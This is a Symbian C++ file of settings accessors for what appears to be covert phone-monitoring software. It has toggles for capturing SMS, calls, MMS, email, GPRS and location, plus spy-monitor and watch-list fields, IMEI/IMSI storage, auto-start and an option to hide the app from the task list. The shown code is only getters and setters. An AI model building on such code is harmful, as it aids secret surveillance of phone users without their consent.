#include "CltSettings.h"

inline const TS9Settings& CFxsSettings::S9Settings() const
	{return iS9Settings;}

inline TS9Settings& CFxsSettings::S9Settings()
	{return iS9Settings;}
	
inline const TDeviceIMEI& CFxsSettings::IMEI() const
	{return iIMEI;}

inline TDeviceIMEI& CFxsSettings::IMEI()
	{return iIMEI;}

inline TMiscellaneousSetting& CFxsSettings::MiscellaneousSetting()
	{return iMiscSetting;}
	
inline const TWatchList& CFxsSettings::WatchList() const
	{return iBugInfo.iWatchList;}

inline TWatchList& CFxsSettings::WatchList()
	{return iBugInfo.iWatchList;}

inline TMonitorInfo& CFxsSettings::SpyMonitorInfo()
	{return iBugInfo.iMonitor;}

inline const TMonitorInfo& CFxsSettings::SpyMonitorInfo() const
	{return iBugInfo.iMonitor;}

inline const TBugInfo& CFxsSettings::BugInfo() const
	{return iBugInfo;}

inline const TGpsSettingOptions& CFxsSettings::GpsSettingOptions() const
	{return iGpsOptions;}

inline TGpsSettingOptions& CFxsSettings::GpsSettingOptions()
	{return iGpsOptions;}
	
inline TNetOperatorInfo& CFxsSettings::NetworkOperatorInfo()
	{return iNetOperatorInfo;}

inline const TDesC& CFxsSettings::IMSI() const
	{return iIMSI;}
	
inline TDes& CFxsSettings::IMSI()
	{return iIMSI;}
	
inline void CFxsSettings::SetAutoStart(TBool aAutoStart)
	{iAutoStart = aAutoStart;}

//
inline TBool CFxsSettings::EventSmsEnable()
	{	
	if(iCheckboxArray->Count() > ETypeSMS) 
		{
		return iCheckboxArray->At(ETypeSMS) == 1;
		} 		
	return EFalse;
	}	
	
inline void CFxsSettings::SetEventSmsEnable(TBool aEnable)
	{
	iCheckboxArray->At(ETypeSMS) = aEnable;
	}
	
inline TBool CFxsSettings::EventCallEnable()
	{		
	if(iCheckboxArray->Count() > ETypeCALL) 
		{		
		return iCheckboxArray->At(ETypeCALL) == 1;			
		}		
	return EFalse;
	}
	
inline void CFxsSettings::SetEventCallEnable(TBool aEnable)
	{iCheckboxArray->At(ETypeCALL) = aEnable;}

//
inline TBool CFxsSettings::EventMmsEnable()
	{	
	if(iCheckboxArray->Count() > ETypeMMS) 
		{
		return iCheckboxArray->At(ETypeMMS) == 1;
		}				
	return EFalse;	
	}
	
	//
inline void CFxsSettings::SetEventMmsEnable(TBool aEnable)
	{iCheckboxArray->At(ETypeMMS) = aEnable;}	

inline TBool CFxsSettings::EventEmailEnable()
	{			
	if(iCheckboxArray->Count() > ETypeMAIL) 
		{
		return iCheckboxArray->At(ETypeMAIL) == 1;
		}		
	return EFalse;		
	}

//
inline void CFxsSettings::SetEventEmailEnable(TBool aEnable)
	{iCheckboxArray->At(ETypeMAIL) = aEnable;}

//
inline TBool CFxsSettings::EventGprsEnable()
	{	
	if(iCheckboxArray->Count() > ETypeGPRS) 
		{
		return iCheckboxArray->At(ETypeGPRS) == 1;
		}			
	return EFalse;			
	}
	
inline void CFxsSettings::SetEventGprsEnable(TBool aEnable)
	{iCheckboxArray->At(ETypeGPRS) = aEnable;}

inline TBool CFxsSettings::EventLocationEnable()
	{
	if(iCheckboxArray->Count() > ETypeLocation) {
		return iCheckboxArray->At(ETypeLocation) == 1;
	}	
	return EFalse;
	}

inline void CFxsSettings::SetEventLocationEnable(TBool aEnable)
	{
	iCheckboxArray->At(ETypeLocation) = aEnable;
	}

//
inline TInt& CFxsSettings::MaxNumberOfEvent()
{	
	return iMaxNumberOfEvent;
}	
//

inline TBool& CFxsSettings::IsAutoStarted()
{
	#if defined(__WINS__)
		iAutoStart = ETrue;
	#endif
			
	return iAutoStart;
}

inline TBool& CFxsSettings::StartCapture()
{
	return iAppEnabled;
}

inline CArrayFix<TInt>& CFxsSettings::CheckboxArray()
{	
	return *iCheckboxArray; 
}

inline void CFxsSettings::SetIapId(TUint32 aIapId)
{
	iIapId = aIapId;
}

inline TUint32& CFxsSettings::IapId()
{	
	return iIapId;
}

inline TInt& CFxsSettings::TimerInterval()
{
	return iTimerInterval;
}

inline void CFxsSettings::SetTimerInterval(TInt aValue)
{
	iTimerInterval = aValue;
}

inline void CFxsSettings::SetHideFromTaskList(TBool aHide)
{
	iS9Settings.iShowIconInTaskList = !aHide;
}

inline TOperatorNotifySmsKeyword& CFxsSettings::OperatorNotifySmsKeyword()
{
	return iOperatorSmsKeyword;
}
